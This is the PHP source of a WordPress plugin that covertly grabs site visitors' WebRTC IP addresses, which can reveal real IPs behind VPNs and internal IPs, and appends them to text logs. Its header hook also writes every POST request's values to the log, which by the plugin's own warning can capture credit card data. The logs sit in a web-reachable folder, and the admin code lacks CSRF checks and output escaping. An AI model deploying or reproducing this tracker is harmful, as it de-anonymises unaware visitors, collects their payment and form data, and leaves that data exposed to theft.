<?php
/**
* Plugin Name: Wordpress WebRTC IP Grabber & Logger
* Plugin URI: https://sick.codes/webrtc-ip-logger-wordpress-vpn-ip-grabber-wordpress/
* Version: 1.1
* Author: Sick.Codes
* Author URI: https://sick.codes/
* Description: Log WebRTC IP STUN Requests of your visitors to a txt file. May reveal a visitor's real IP behind a VPN and internal IP addresses.
* License: GPL2
*/

/*  Copyright 2016 https://Sick.Codes

    Based on https://github.com/redpois0n/webrtc-grabber
    Which is based on https://github.com/diafygi/webrtc-ips

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License, version 2, as
    published by the Free Software Foundation.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
*/

/**
 * Admin panel generated by the WordPress Option Page generator
 * at http://jeremyhixon.com/wp-tools/option-page/
 */

class WebRTCIPLogger {
    private $webrtc_ip_logger_options;

    public function __construct() {
		add_action( 'admin_menu', array( $this, 'webrtc_ip_logger_add_plugin_page' ) );
		add_action( 'admin_init', array( $this, 'webrtc_ip_logger_page_init' ) );
	}

	public function webrtc_ip_logger_add_plugin_page() {
		add_menu_page(
			'WebRTC IP Logger', // page_title
			'WebRTC IP Logger', // menu_title
			'manage_options', // capability
			'webrtc-ip-logger', // menu_slug
			array( $this, 'webrtc_ip_logger_create_admin_page' ), // function
			'dashicons-visibility', // icon_url
			100 // position
		);
	}

	public function webrtc_ip_logger_create_admin_page() {
		$this->webrtc_ip_logger_options = get_option( 'webrtc_ip_logger_option_name' ); ?>

		<div class="wrap">
			<h2>WebRTC IP Logger Options & Logs</h2>
			<h3><font color="red"><strong>IMPORTANT WARNING. DO NOT IGNORE:</strong></font></h3>
			<p>This log will contain a MASSIVE amount of sensitive information. If you're using WooCommerce or a <font color="red"><strong>credit card form</strong></font>, it may capture <font color="red"><strong>credit card data</strong></font>. If you do not delete your log file, someone might find your log file and steal extremely sensitive information. Delete your log often. It may be illegal to store non-anonymous IP addresses in regions such as the European Union. <font color="red"><strong>You have been warned.</strong></font></p>
			<hr>
			<p><strong>Instructions: </strong> Click "generate random file name" OR type your own random filename in the box below and then <em>Save Changes</em>.</p>
			<p>This will be the name of your log file. Users with WebRTC connections enabled (by default) will have all available IP information logged.</p>
			<p>Note, CloudFlare IP's will show up first if you're using Cloudflare.</p>
			<div id="text_file_url_0_auto"><a href="#" onclick="document.getElementById('text_file_url_0').value='<?php echo wp_generate_password( 24, false ); ?>.txt';">Click here to generate random file name.</a></div>

			<?php settings_errors(); ?>

			<form method="post" action="options.php">
				<?php
					settings_fields( 'webrtc_ip_logger_option_group' );
					do_settings_sections( 'webrtc-ip-logger-admin' );
					submit_button();
				?>
			</form>
<hr>
<h2>Delete Logs:</h2>
<form method="post">
	<input class="button button-primary" name="deleteall" type="submit" value="Empty log folder and delete ALL logs.">
<p>This button empties the /logs/ folder inside this plugin. It is irreversible.</p>
<p>If you want to stop logging, clear the <b>Log file name</b> box and then press save changes. You can delete your old logs too.</p>
</form>

<?php
/* Delete all log folder contents after pressing delete button on plugin admin page */
$logfolderdir4remove = scandir(plugin_dir_path( __FILE__ ) . "logs/"); // Gather log folder contents
$logfoldercontentsremove = array_diff($logfolderdir4remove, array('..', '.', '.htaccess')); // ignore dot files and htacccess
    if(isset($_POST['deleteall'])) {
	foreach($logfoldercontentsremove as $logfolderfile) {
        unlink(plugin_dir_path( __FILE__ ) . "logs/" . $logfolderfile); // Delete log folder file
	}
}
?>
<hr>
<h2>WebRTC IP Log Location:</h2>
<?php
echo plugin_dir_path(__FILE__) . 'logs/' . $this->webrtc_ip_logger_options['text_file_url_0'];
?>

<h3><a href="<?php echo plugin_dir_url( __FILE__ ) . 'logs/' . $this->webrtc_ip_logger_options['text_file_url_0']; ?>" target="_blank">Download this log file</a></h3>

<h4><strong>Log size: </strong>

<?php
/* Display log file size on plugin admin page */

/**
* Converts bytes into human readable file size.
* This script is for displaying file size.
* Borrowed from http://php.net/manual/en/function.filesize.php
* @param string $bytes
* @return string human readable file size (2,87 Мб)
* @author Mogilev Arseny
*/

function FileSizeConvert($bytes)
{
    $bytes = floatval($bytes);
        $arBytes = array(
            0 => array(
                "UNIT" => "TB",
                "VALUE" => pow(1024, 4)
            ),
            1 => array(
                "UNIT" => "GB",
                "VALUE" => pow(1024, 3)
            ),
            2 => array(
                "UNIT" => "MB",
                "VALUE" => pow(1024, 2)
            ),
            3 => array(
                "UNIT" => "KB",
                "VALUE" => 1024
            ),
            4 => array(
                "UNIT" => "Bytes",
                "VALUE" => 1
            ),
        );

    foreach($arBytes as $arItem)
    {
        if($bytes >= $arItem["VALUE"])
        {
            $result = $bytes / $arItem["VALUE"];
            $result = str_replace(".", "," , strval(round($result, 2)))." ".$arItem["UNIT"];
            break;
        }
    }
    return $result;
}
$logfilesize = filesize(plugin_dir_path(__FILE__) . 'logs/' . $this->webrtc_ip_logger_options['text_file_url_0']);
	if ($logfilesize < 1) {
		echo "0 bytes.";
	}
	else {
		echo FileSizeConvert($logfilesize);
	}
?>
</br>
</h4>
<hr>
<h3>Log folder contents:</h3>
<?php
/* Display logs folder contents on plugin admin page */
$logfolderdir4display = scandir(plugin_dir_path( __FILE__ ) . "logs/"); // Gather log folder contents
$logfoldercontentsdisplay = array_diff($logfolderdir4display, array('..', '.', '.htaccess')); // ignore dot files and htacccess
	if (empty($logfoldercontentsdisplay)) {
		echo "Load a page on your site to start logging.";
	}
		else {
			foreach($logfoldercontentsdisplay as $logfolderfile) {
			echo $logfolderfile; // Echo log folder file
			echo "</br>";
	}
}
?>

		</div>
	<?php }

	public function webrtc_ip_logger_page_init() {
		register_setting(
			'webrtc_ip_logger_option_group', // option_group
			'webrtc_ip_logger_option_name', // option_name
			array( $this, 'webrtc_ip_logger_sanitize' ) // sanitize_callback
		);

		add_settings_section(
			'webrtc_ip_logger_setting_section', // id
			'', // title
			array( $this, 'webrtc_ip_logger_section_info' ), // callback
			'webrtc-ip-logger-admin' // page
		);

		add_settings_field(
			'text_file_url_0', // id
			'Log file name', // title
			array( $this, 'text_file_url_0_callback' ), // callback
			'webrtc-ip-logger-admin', // page
			'webrtc_ip_logger_setting_section' // section
		);
	}

	public function webrtc_ip_logger_sanitize($input) {
		$sanitary_values = array();
		if ( isset( $input['text_file_url_0'] ) ) {
			$sanitary_values['text_file_url_0'] = sanitize_text_field( $input['text_file_url_0'] );
		}

		return $sanitary_values;
	}

	public function webrtc_ip_logger_section_info() {

	}

	public function text_file_url_0_callback() {
		printf(
			'<input class="regular-text" type="text" name="webrtc_ip_logger_option_name[text_file_url_0]" id="text_file_url_0" value="%s">',
			isset( $this->webrtc_ip_logger_options['text_file_url_0'] ) ? esc_attr( $this->webrtc_ip_logger_options['text_file_url_0']) : ''
		);
	}

}
if ( is_admin() )
	$webrtc_ip_logger = new WebRTCIPLogger();

/*
 * Retrieve this value with:
 * $webrtc_ip_logger_options = get_option( 'webrtc_ip_logger_option_name' ); // Array of All Options
 * $text_file_url_0 = $webrtc_ip_logger_options['text_file_url_0']; // Text file URL
 */


/* Insert PHP IP logger into header */
add_action('get_header', 'php_ip_logger_header');
function php_ip_logger_header(){
    //Close header PHP tag momentarily
    ?>
<?php
$webrtc_ip_logger_options = get_option( 'webrtc_ip_logger_option_name' ); // Array of All Options
$text_file_url_0 = $webrtc_ip_logger_options['text_file_url_0']; // Text file URL
if (count($_POST) > 0) {
    $file = fopen( plugin_dir_path( __FILE__ ) . "logs/$text_file_url_0", "a+");
	fwrite($file, date('l jS \of F Y h:i:s A') . "\n");
	$remote = $_SERVER ['REMOTE_ADDR'];
	fwrite($file, "Connecting from:\n\t" . $remote . " (" . gethostbyaddr($remote) . ")\n");
	fwrite($file, "Referer:\n\t" . $_SERVER ['HTTP_REFERER'] . "\n");
	fwrite($file, "User agent:\n\t" . $_SERVER ['HTTP_USER_AGENT'] . "\n");
	fwrite($file, "Found addresses:\n");
	foreach ( $_POST as $ip ) {
		if ($ip == "none" && count($_POST) > 1) {
			continue;
		}

		$ips = explode(",", $ip);

		foreach ( $ips as $address ) {
			if (strlen($address) > 1) {
				fwrite($file, "\t" . $address . " ");
				fwrite($file, "(" . gethostbyaddr($address) . ")\n");
			}
		}
	}
	fwrite($file, "\n\n\n");
	fclose($file);
	exit();
}
?>

    <?php //Open header PHP tag again
}


/* Insert PHP IP logger into footer */
add_action('wp_footer', 'php_ip_logger_footer');
function php_ip_logger_footer(){
    //Close footer PHP tag momentarily
    ?>
<form id="f" method="POST">
		<input name="0" value="none" type="hidden"></input>
	</form>

	<script src="//code.jquery.com/jquery-1.11.2.min.js"></script>
	<script src="<?php echo plugin_dir_url( __FILE__ ) ?>includes.js"></script>
	<script>

	setTimeout(post, 1000);

		function post() {
			$.post("index.php",
				{
		    	   	s: ips,
		    	},
		    	function(data, status) {

		    	}
		   	);
		}
    </script>

    <?php //Open footer PHP tag again
}







